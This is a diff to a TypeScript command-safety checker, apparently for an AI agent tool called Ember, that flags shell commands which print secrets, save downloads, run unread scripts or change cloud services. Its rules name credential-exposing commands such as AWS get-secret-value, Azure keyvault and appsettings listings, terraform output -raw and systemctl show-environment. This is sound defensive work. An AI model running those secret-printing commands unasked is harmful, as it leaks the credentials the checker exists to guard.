+  return got.findings.some(f => f.cls === "secret" || f.rule === "path.secret" || f.rule === "secret.env");
+}
+
 const AWS_SECRET = /^(get-session-token|assume-role.*|get-login-password|get-authorization-token|get-secret-value|get-parameters?|get-parameters-by-path|decrypt|get-federation-token|create-access-key|get-credentials-for-identity|get-signin-token)$/;
 reg(NATIVE, Object.keys(CLOUD_CLIS), h => {
   const service = CLOUD_CLIS[h.key];
@@ -8111,6 +8549,8 @@ reg(NATIVE, Object.keys(CLOUD_CLIS), h => {
     positional.push(a.v);
   }
   const verbs = positional.map(p => p.toLowerCase());
+  if (cloudPrintsSecrets(h.key, verbs, rest, h.e.ctx)) h.e.add("secret", "secret.cloud", SAYS.secrets);
+  if (podRunsUnread(h.key, verbs, rest, h.s)) h.e.unclear("unclear.remote-command", "It runs a command in the pod that Ember can't read first.");
   // A syntax check or a listing reads (review #30). `--check` doesn't: a task with `check_mode: false` still changes the
   // managed computers, so it asks without saying that it changes them.
   if (h.key === "ansible-playbook" && h.args.some(a => /^(--syntax-check|--list-hosts|--list-tasks|--list-tags)$/.test(a.v ?? ""))) return;
@@ -8160,7 +8600,10 @@ reg(NATIVE, Object.keys(CLOUD_CLIS), h => {
   // out in full (`-raw` and `-json` don't mask what is marked sensitive): secrets too (commands-remote-r9-9). What the
   // verb is judged to do besides stays, so none of them loses a danger it had (`az keyvault secret download`,
   // `terraform state pull` asked as changes).
-  if ((h.key === "az" && (/^keyvault (secret|key|certificate) (show|download|backup)\b/.test(all) || /\b(keys list|list-keys|credential show|show-connection-string|get-credentials|list-credentials|keys renew)\b/.test(all)))
+  if ((h.key === "az" && (/^keyvault (secret|key|certificate) (show|download|backup)\b/.test(all) || /\b(keys list|list-keys|credential show|show-connection-string|get-credentials|list-credentials|keys renew)\b/.test(all)
+      // An app's settings as Azure prints them hold its connection strings and keys, and a container app's secrets with
+      // their values (r10-commands-y10-7).
+      || /^(webapp|functionapp|logicapp|staticwebapp) (config )?appsettings list\b/.test(all) || (/^containerapp secret (list|show)\b/.test(all) && h.args.some(a => a.v === "--show-values"))))
     || ((h.key === "terraform" || h.key === "tofu") && ((verbs[0] === "output" && h.args.some(a => /^-(raw|json)$/.test(a.v ?? ""))) || (verbs[0] === "show" && h.args.some(a => a.v === "-json")) || all.startsWith("state pull")))) {
     h.e.add("secret", "secret.cloud", SAYS.secrets, { program: `${h.key} ${verb}` });
   }
@@ -8227,9 +8670,11 @@ reg(NATIVE, Object.keys(CLOUD_CLIS), h => {
     h.e.add("remote-delete", "cloud.delete", `Deletes something in ${service}.`, { objects: [{ kind: "other", text: verb, abs: null }], program: `${h.key} ${verb}` });
     return;
   }
-  // A verb Ember doesn't know may only read: the card says it can't tell rather than that it changes the service.
+  // A verb Ember doesn't know may only read: the card says it can't tell rather than that it changes the service. It is
+  // a tool's command Ember doesn't know, which may print secrets or change anything: Autopilot asks and Assisted's
+  // check isn't asked (commands-remote-c10-1).
   const changes = !checkRun && (CLOUD_VERBS.has(verb) || CLOUD_CHANGE.test(verb) || (h.key === "ansible" || h.key === "ansible-playbook"));
-  h.e.add("publish", "cloud.change", changes ? `Changes ${service}.` : `Ember can't tell whether this changes ${service}.`, { objects: [{ kind: "other", text: verb, abs: null }], program: `${h.key} ${verb}` });
+  h.e.add("publish", changes ? "cloud.change" : "cloud.unknown-verb", changes ? `Changes ${service}.` : `Ember can't tell whether this changes ${service}.`, { objects: [{ kind: "other", text: verb, abs: null }], program: `${h.key} ${verb}` });
 });
 
 // ------------------------------------------------------------------------------------------------------------------
@@ -8372,6 +8817,8 @@ reg(NATIVE, ["npm", "pnpm", "yarn", "bun", "corepack"], h => {
     return;
   }
   const specs = rest.filter(a => !isOption(a));
+  // A package script is shell Ember doesn't read from package.json: one the task wrote asks (r10-commands-y10-5).
+  if (/^(run|run-script|rum|urn|test|tst|t|start|stop|restart)$/.test(verb) && h.key !== "corepack") h.e.recordImplied(lit("package.json"), h.sc);
   // `pnpm recursive x`, `pnpm m x` and `pnpm multi x` are `pnpm -r x`: the line after the word is pnpm's own
   // (commands-runners-x9-5).
   if (h.key === "pnpm" && /^(recursive|m|multi)$/.test(verb) && specs.length > 0 && !h.e.readsAsMain) { NATIVE.pnpm({ ...h, args: rest }); return; }
@@ -8598,7 +9045,8 @@ reg(NATIVE, ["pipx", "poetry", "pipenv", "uv", "rye", "pdm", "hatch", "conda", "
     return;
   }
   if ((h.key === "deno") && verb === "eval") { h.e.unclear("unclear.inline-code", "It runs code given on the command line."); return; }
-  if (h.key === "deno" && (verb === "run" || verb === "test" || verb === "task")) { if (verb === "task") nameCheck(h, specs[0]?.v ?? ""); else if (specs[0]) runScript(h, specs[0]); return; }
+  // What deno runs or tests is code Ember doesn't read: one the task wrote asks (r10-commands-x10-6).
+  if (h.key === "deno" && (verb === "run" || verb === "test" || verb === "task")) { if (verb === "task") nameCheck(h, specs[0]?.v ?? ""); else if (specs[0]) runScript(h, specs[0], "code"); return; }
   if ((h.key === "poetry" || h.key === "pipenv") && verb === "shell") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
   if (/^(poetry|flit|hatch|pdm|uv|rye)$/.test(h.key) && verb === "publish") { h.e.add("publish", `${h.key}.publish`, "Publishes a package to the registry.", { program: `${h.key} publish`, objects: [{ kind: "package", text: "", abs: null }] }); return; }
   if (h.key === "gem" && verb === "push") { h.e.add("publish", "gem.push", `Publishes ${specs[0]?.v ?? "a gem"} to the registry.`, { program: "gem push", objects: [{ kind: "package", text: specs[0]?.v ?? "", abs: null }] }); return; }
@@ -8672,7 +9120,8 @@ reg(NATIVE, ["go"], h => {
   }
   if (verb === "install" || verb === "get") { languageInstall(h, rest.filter(a => !isOption(a))); return; }
   if (verb === "run" && rest.some(a => /@/.test(a.v ?? "") && !isOption(a))) { h.e.add("escape", "escape.npx", SAYS.downloadsProgram); return; }
-  if (verb === "run") { const s = rest.find(a => !isOption(a)); if (s) runScript(h, s); return; }
+  // `go run a.go b.go`: each source is code Ember doesn't read; one the task wrote asks (r10-commands-x10-6).
+  if (verb === "run") { const s = rest.find(a => !isOption(a)); if (s) runScript(h, s, "code"); for (const a of rest) if (a !== s && a.v !== null && /\.go$/i.test(a.v)) h.e.recordScript(a, "code", h.sc); return; }
   if (verb === "clean" && rest.some(a => /^-(cache|modcache|testcache|fuzzcache)$/.test(a.v ?? ""))) h.e.add("destroy", "script.destroy", "Runs clean, whose name says it deletes things.");
   // build and test -c write the program where -o says, a file or a folder (review #169).
   if (verb === "build" || verb === "test") {
@@ -8760,6 +9209,14 @@ reg(NATIVE, ["make", "gmake", "mingw32-make", "nmake", "just", "rake", "invoke",
     return;
   }
   for (const f of values(p, "f", "file", "makefile", "justfile", "build-file", "b", "settings-file", "c", "init-script", "I")) if (f && !STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
+  // A makefile's recipes are shell Ember doesn't read: one the task wrote asks, as a script it wrote does
+  // (r10-commands-y10-5). Its folder is -C's, or this one.
+  if (gnuMake) {
+    const given = values(p, "f", "file", "makefile");
+    const dirs = values(p, "C", "directory");
+    const dir = dirs.length ? dirs[dirs.length - 1] : ".";
+    if (dir !== null) for (const f of given.length ? given : ["GNUmakefile", "makefile", "Makefile"]) if (f) h.e.recordImplied(lit(dir === "." || f.startsWith("/") ? f : `${dir}/${f}`), h.sc);
+  }
   // `ninja -t <tool>` runs one of ninja's own tools, not a target (review #167).
   if (h.key === "ninja" && values(p, "t").length) { ninjaTool(h, values(p, "t")[0]); return; }
   // make takes the word after -j or -l only when it is a count or a variable, so a value the text gives a variable there
@@ -9032,6 +9489,27 @@ function optionWords(args: readonly Arg[], p: Parsed, ...names: string[]): Arg[]
   });
 }
 
+/**
+ * An option's value Ember can't see all of, attached to it (`-o"$f"`, `-sSLo"$f"`, `--output="$f"`): the parser reads
+ * such a word as an operand, so each is found here, its value's pieces kept as optionWords gives them
+ * (commands-remote-r10-5). `short` is the letter; `values` the program's short options that take a value, none of
+ * which may come before it in the cluster.
+ */
+function attachedUnseen(args: readonly Arg[], short: string, long: string, values: string): Arg[] {
+  const out: Arg[] = [];
+  for (const a of args) {
+    if (a.v !== null || a.param !== undefined || !a.parts || typeof a.parts[0] !== "string") continue;
+    const head = a.parts[0];
+    const l = head.startsWith(`--${long}=`) ? `--${long}=`.length : -1;
+    const m = /^-([A-Za-z0-9]*)/.exec(head);
+    const at = l >= 0 ? l : m && !head.startsWith("--") && m[1].includes(short) && ![...m[1].slice(0, m[1].indexOf(short))].some(c => values.includes(c)) ? m[1].indexOf(short) + 2 : -1;
+    if (at < 0) continue;
+    const first = head.slice(at);
+    out.push({ v: null, raw: a.raw.slice(at), glob: false, parts: [...(first ? [first] : []), ...a.parts.slice(1)] });
+  }
+  return out;
+}
+
 /** The host of a URL or `user@host:path`. */
 function hostOf(s: string): string {
   const u = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/]*@)?(\[[^\]]+\]|[^/:?#]+)/i.exec(s);
@@ -9091,6 +9569,7 @@ reg(NATIVE, ["curl", "curl.exe"], h => {
     // `-o '#1.sh'` with an address's {a,b} or [1-3]: a name from each address, none of which Ember names.
     if (/#\d/.test(o)) h.e.downloadUnnamed(path.includes("/") ? path.slice(0, path.lastIndexOf("/") + 1) : ".", h.sc);
   }
+  for (const w of attachedUnseen(h.args, "o", "output", "AbcCdeEFHKmPrtTuUwXxyYzDQ")) h.e.downloadTo(outDir ? { ...w, parts: [`${outDir}/`, ...(w.parts ?? [])] } : w, h.sc);
   // -J saves under the name the server sends, when it sends one (commands-remote-c5-2).
   if (has(p, "O", "remote-name", "remote-name-all") && has(p, "J", "remote-header-name")) h.e.downloadUnnamed(outDir ?? ".", h.sc);
   if (has(p, "O", "remote-name", "remote-name-all")) {
@@ -9132,6 +9611,9 @@ reg(NATIVE, ["wget", "wget2"], h => {
   if (h.args.some(a => /^--use-askpass/.test(a.v ?? ""))) h.e.unclear("unclear.wget-askpass", "It runs a program Ember can't see.");
   if (values(p, "config").length) { h.e.unclear("unclear.curl-config", "It reads its options from a file Ember can't see."); h.e.markUnnamed(null, h.sc); }
   const dir = values(p, "P", "directory-prefix")[0];
+  // `-O"$f"`, `--output-document="$f"`: a name Ember can't see all of, which the parser takes for an address
+  // (commands-remote-r10-5).
+  for (const w of attachedUnseen(h.args, "O", "output-document", "oaPiBtTwQeUlAIRDXlY")) h.e.downloadTo(w, h.sc);
   const out = values(p, "O", "output-document")[0];
   if (out !== undefined) {
     if (out === null) h.e.downloadTo(optionWords(h.args, p, "O", "output-document")[0] ?? { v: null, raw: "", glob: false }, h.sc);
@@ -9619,6 +10101,67 @@ reg(NATIVE, ["mail", "mailx", "sendmail", "msmtp", "swaks", "mutt", "neomutt", "
   h.e.add("publish", "send.mail", "Sends an email.");
   for (const a of h.args) if (h.args[h.args.indexOf(a) - 1]?.v === "-a" || h.args[h.args.indexOf(a) - 1]?.v === "-A") h.e.usePath(a, "read", h.sc);
 });
+/**
+ * Fetch tools whose rows (or lack of one) say nothing of what they save: the files or folders they save into are this
+ * task's downloads, so running one later asks (commands-remote-r10-5). A name Ember can't tell is a file of unknown
+ * name in the folder it saves into; a listing or a dry run saves nothing.
+ */
+function fetchToolSaves(e: Engine, key: string, args: readonly Arg[], sc: Scope): void {
+  const ops = args.filter(a => !isOption(a));
+  const opt = (...names: string[]): (string | null)[] => {
+    const out: (string | null)[] = [];
+    for (let k = 0; k < args.length; k++) {
+      const v = args[k].v;
+      if (v === null) continue;
+      for (const n of names) {
+        if (v === n) out.push(args[k + 1]?.v ?? null);
+        else if (n.startsWith("--") && v.startsWith(`${n}=`)) out.push(v.slice(n.length + 1));
+        else if (!n.startsWith("--") && v.startsWith(n) && v.length > n.length) out.push(v.slice(n.length));
+      }
+    }
+    return out;
+  };
+  const into = (d: string | null | undefined): void => { if (d === null) e.markUnnamed(null, sc); else e.markUnnamed(d ?? ".", sc); };
+  const file = (f: string | null | undefined): void => { if (f === null || f === undefined) into(f === null ? null : "."); else if (/[\\/]$/.test(f)) into(f); else e.download(f, sc); };
+  const remote = (v: string | null): boolean => v !== null && /^(s3|b2|gs|hf):\/\//i.test(v);
+  if (key === "s3cmd") {
+    const verb = ops[0]?.v ?? "";
+    const rest = ops.slice(1);
+    if (verb === "get" && rest.some(a => remote(a.v))) {
+      const dest = rest.length > 1 && !remote(rest[rest.length - 1].v) ? rest[rest.length - 1] : undefined;
+      if (args.some(a => /^(-r|--recursive)$/.test(a.v ?? "")) || rest.slice(0, dest ? -1 : undefined).some(a => a.v === null || /\/$/.test(a.v ?? "")) || rest.length > 2) into(dest ? dest.v : ".");
+      else if (dest) file(dest.v);
+      else file((rest[0].v ?? "").split("/").pop() || null);
+    } else if (verb === "sync" && rest.length >= 2 && remote(rest[0].v)) into(rest[rest.length - 1].v);
+  } else if (key === "b2") {
+    const verb = ops[0]?.v ?? "";
+    if (/^download-file(-by-(name|id))?$/.test(verb) || (verb === "file" && ops[1]?.v === "download")) file(ops[ops.length - 1]?.v ?? null);
+    else if (verb === "sync" && ops.length >= 3 && remote(ops[1].v)) into(ops[ops.length - 1].v);
+  } else if (key === "gdown") {
+    if (args.some(a => /^(-h|--help|--version)$/.test(a.v ?? ""))) return;
+    const out = opt("-O", "--output");
+    if (args.some(a => a.v === "--folder")) into(out[0] ?? ".");
+    else if (out.length) file(out[0]);
+    else into(".");
+  } else if (key === "yt-dlp" || key === "youtube-dl") {
+    if (args.some(a => /^(-F|--list-formats|-s|--simulate|--skip-download|-j|--dump-json|-J|--dump-single-json|--get-url|-g|-h|--help|--version)$/.test(a.v ?? ""))) return;
+    const out = opt("-o", "--output");
+    const paths = opt("-P", "--paths");
+    if (out.length && out[0] !== null && !/%|\{/.test(out[0]) && paths.length === 0) file(out[0]);
+    else into(paths.length ? paths[0] : out[0] === null ? null : out.length && /[\\/]/.test(out[0]!) ? out[0]!.slice(0, out[0]!.search(/[^\\/]*$/)) : ".");
+  } else if (key === "huggingface-cli" || key === "hf") {
+    if (ops[0]?.v !== "download") return;
+    const dir = opt("--local-dir")[0];
+    const cache = opt("--cache-dir")[0];
+    into(dir !== undefined ? dir : cache !== undefined ? cache : null);
+  } else if (/^(npm|pnpm|yarn|bun)$/.test(key) && ops[0]?.v === "pack") {
+    // A package of the registry's packed here (`npm pack x`); the project's own pack (`npm pack`, `npm pack .`) is not.
+    const specs = args.filter((a, k) => !isOption(a) && !/^(--pack-destination|-w|--workspace|--filter|-F)$/.test(args[k - 1]?.v ?? "")).slice(1);
+    if (args.some(a => a.v === "--dry-run") || !specs.some(a => a.v === null || !/^\.{1,2}([\\/].*)?$|^[\\/]/.test(a.v))) return;
+    into(opt("--pack-destination")[0]);
+  }
+}
+
 reg(NATIVE, ["s3cmd", "azcopy", "gdrive", "dropbox_uploader", "megaput", "transfer"], h => {
   const verb = firstOperand(h.args).v ?? "";
   if (/^(del|rm|rb|delete|remove)$/.test(verb)) h.e.add("remote-delete", "cloud.delete", "Deletes files on a remote service.");
@@ -9762,6 +10305,7 @@ reg(NATIVE, ["patch", "gpatch"], h => {
   if (patchFile) h.e.usePath(patchFile, "read", sc);
   // A patch this task downloaded, or one fetched into it: what it changes is that download (commands-remote-c5-4).
   const patches = [...values(p, "i", "input").flatMap(f => (f ? [lit(f)] : [])), ...(patchFile ? [patchFile] : [])];
+  for (const f of [...patches, ...h.s.redirs.flatMap(r => (r.kind === "read" && r.target ? [r.target] : []))]) h.e.notePatch(f, sc);
   if (appliesDownload(ph, patches)) {
     if (file?.v) h.e.carryDownload(file.v, sc);
     else h.e.markUnnamed(".", sc);
@@ -9806,6 +10350,14 @@ reg(NATIVE, ["systemctl"], h => {
   const verb = h.args[g.verbAt]?.v ?? null;
   const units = h.args.slice(g.verbAt + 1).filter(a => !isOption(a));
   if (verb === null) return;
+  // The service manager's environment, and a unit's properties with its Environment= (passwords and tokens a unit is
+  // given) unless only other properties are asked for (commands-remote-r10-6).
+  if (verb === "show-environment") { h.e.add("secret", "secret.env", SAYS.env); return; }
+  if (verb === "show") {
+    const props = h.args.flatMap((a, k) => (a.v === "-p" || a.v === "--property" ? [h.args[k + 1]?.v ?? null] : a.v !== null && /^(-p.|--property=)/.test(a.v) ? [a.v.replace(/^(-p|--property=)/, "")] : []));
+    if (props.length === 0 || props.some(p => p === null || /environment|^$/i.test(p))) h.e.add("secret", "secret.env", SAYS.env);
+    return;
+  }
   if (/^(poweroff|reboot|halt|suspend|hibernate|hybrid-sleep|suspend-then-hibernate|kexec|emergency|rescue|default|exit|soft-reboot)$/.test(verb)) { h.e.add("system", "system.power", "Shuts down, restarts or logs out."); return; }
   if (/^(start|stop|restart|reload|try-restart|reload-or-restart|try-reload-or-restart|condrestart|force-reload)$/.test(verb)) {
     h.e.add("system", "service.unit", "Starts, stops or changes a system service.", { objects: units.map(u => ({ kind: "other" as const, text: u.v ?? u.raw, abs: null })), widening: [verb], program: `systemctl ${verb}` });
